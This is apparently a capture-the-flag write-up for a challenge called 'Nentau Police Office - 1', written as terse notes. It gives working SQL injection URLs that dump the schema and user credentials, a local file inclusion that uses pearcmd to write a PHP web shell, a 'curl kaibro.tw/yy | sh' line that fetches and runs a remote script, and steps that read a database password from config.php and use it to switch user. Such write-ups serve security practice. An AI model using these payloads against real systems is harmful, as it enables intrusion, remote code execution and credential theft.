# Nentau Police Office - 1

- SQL Injection:
    - dump schema: http://34.81.46.184:37463/news.php?id=-1%20union%20select%201,2,group_concat(schema_name),4,5%20from%20information_schema.schemata
    - dump user: http://34.81.46.184:37463/news.php?id=-1%20union%20select%201,2,group_concat(concat(uid,0x20,username,0x20,password)),4,5%20from%20users
        - `1 tsjadmin RRwZriRCF3CoYtbjkF3u` 
- LFI
    - http://34.81.46.184:37463/adminmanager.php?op=././././users
    - using pearcmd to RCE: 
        - `/adminmanager.php?+config-create+/&op=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=system($_GET[1]);?>+/var/tmp/a.php`
        - `/adminmanager.php?op=../../../../../../../../var/tmp/a&1=curl%20kaibro.tw/yy%20|%20sh`
- flag permission 
    - flag1.txt owner is `tsjadmin`
- find password of `tsjadmin`
    - `cat /var/www/html/config.php` : 

    ```
    ...
    $host = "database";
    $dbname = "announcement";
    $user = "tsjadmin";
    $pass = "tsjadmin@nentaupoliceoffice";
    $db = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
    session_start();
    ...
    ```

- `su tsjadmin` with password `tsjadmin@nentaupoliceoffice`
- `cat /flag1.txt`
- `TSJ{Just_an_simple_Penetration_Testing_challenge}`
